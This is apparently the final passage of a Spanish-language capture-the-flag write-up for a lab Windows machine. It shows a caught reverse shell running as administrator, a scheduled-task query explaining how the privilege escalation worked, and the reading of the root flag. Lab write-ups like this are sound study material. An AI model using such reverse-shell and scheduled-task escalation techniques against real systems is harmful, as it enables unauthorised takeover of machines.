connect to [Tu_IP] from (UNKNOWN) [192.168.100.200] 49715
Microsoft Windows [Version 10.0.20348.587]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
thehexguns\administrador
```
Somos el **Administrador**.

Esto funcionó porque quien está ejecutando este binario es el **Administrador** de la máquina víctima:
```batch
C:\Windows\system32>schtasks /query /fo LIST /v | findstr /i HexGuns
schtasks /query /fo LIST /v | findstr /i HexGuns
HostName:                             THEHEXGUNS
HostName:                             THEHEXGUNS
HostName:                             THEHEXGUNS
HostName:                             THEHEXGUNS
Author:                               THEHEXGUNS\Administrador
Task To Run:                          "C:\Program Files\HexGuns\setlist_uploader.exe"
...
```
Esta comprobación no se pudo hacer en **Evil-Winrm** porque nos pedía privilegios elevados.

Ya solamente obtengamos la última flag:
```batch
C:\Windows\system32>cd C:\Users\Administrador\Desktop
cd C:\Users\Administrador\Desktop
C:\Users\Administrador\Desktop>type root.txt
type root.txt
...
```
Y con esto, terminamos la máquina.
